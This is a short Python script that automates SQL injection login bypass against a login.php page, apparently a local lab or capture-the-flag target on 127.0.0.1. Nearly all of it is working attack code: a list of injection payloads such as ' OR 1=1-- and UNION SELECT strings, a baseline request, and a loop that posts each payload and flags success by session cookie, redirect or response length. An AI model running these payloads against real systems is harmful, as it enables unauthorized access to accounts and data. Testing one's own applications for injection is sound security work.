import requests

url = "http://127.0.0.1:33167/login.php"

payloads = [
    "admin' OR '1'='1'--",
    "admin'--",
    "' OR 1=1--",
    "' OR '1'='1",
    "admin'#",
    "admin'/*",
    "admin' AND '1'='1'--",
    "admin' UNION SELECT 1,2--"
]

# Baseline
s = requests.Session()
r = s.post(url, data={'username':'admin','password':'admin'}, allow_redirects=False)
baseline_len = len(r.content)
print(f"BASELINE admin/admin: status={r.status_code} len={baseline_len}B")

# Test payloads
s = requests.Session()
print("\nTesting payloads:")
print("Payload | Status | Cookie | Length | Success")

for p in payloads:
    r = s.post(url, data={'username':p,'password':'x'}, allow_redirects=False, timeout=10)
    has_cookie = 'PHPSESSID' in r.cookies
    length = len(r.content)
    success = has_cookie or (300 <= r.status_code < 400) or length != baseline_len
    print(f"{p[:25]} | {r.status_code} | {has_cookie} | {length}B | {success}")
    
    if success:
        print(f"\n[!] SUCCESS INDICATORS DETECTED!")
        print(f"Full response: {r.text[:500]}")
        break

print("\n[*] Testing complete")

